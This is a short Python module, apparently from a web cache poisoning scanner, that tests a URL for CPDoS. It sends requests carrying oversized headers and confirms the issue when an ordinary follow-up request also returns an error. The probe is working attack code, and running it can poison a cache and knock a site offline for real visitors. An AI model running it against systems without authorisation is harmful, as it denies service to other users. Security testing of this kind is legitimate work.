#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import traceback

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def HHO(url, s, main_status_code, authent):
    #HTTP Header Oversize 

    cpdos_win = False
    max_i = 20
    i = 0
    while i < max_i:
        big_value = """Big-Value-0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"""
        h = {"X-Oversized-Header-{}".format(i):"{}".format(big_value)}
        try:
            req_hho = s.get(url, headers=h, auth=authent, allow_redirects=False, timeout=10)
            #print(req_hho.status_code)
            #print(h)
            if req_hho.status_code in [400, 413, 500, 502] and req_hho.status_code != main_status_code:
                print(h)
                print(url)
                print(req_hho.status_code)
                #print(req_hho.headers)
                i = 20
                cpdos_win = True
            i += 1
        except KeyboardInterrupt:
            pass
        except:
            #traceback.print_exc()
            pass
    if cpdos_win:
        req_hho_verify = s.get(url, auth=authent, allow_redirects=False, timeout=10)
        if req_hho_verify.status_code in [400, 413, 500, 502] and req_hho_verify.status_code != main_status_code:
            print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | HHO DOS: {} | \033[34m{} > {}\033[0m | PAYLOAD: {}".format(url, main_status_code, req_hho_verify.status_code, h))
        else:
            print("  \033[33m└── INTERESTING BEHAVIOR\033[0m | HHO DOS: {} | \033[34m{} > {}\033[0m | PAYLOAD: {}".format(url, main_status_code, req_hho_verify.status_code, h))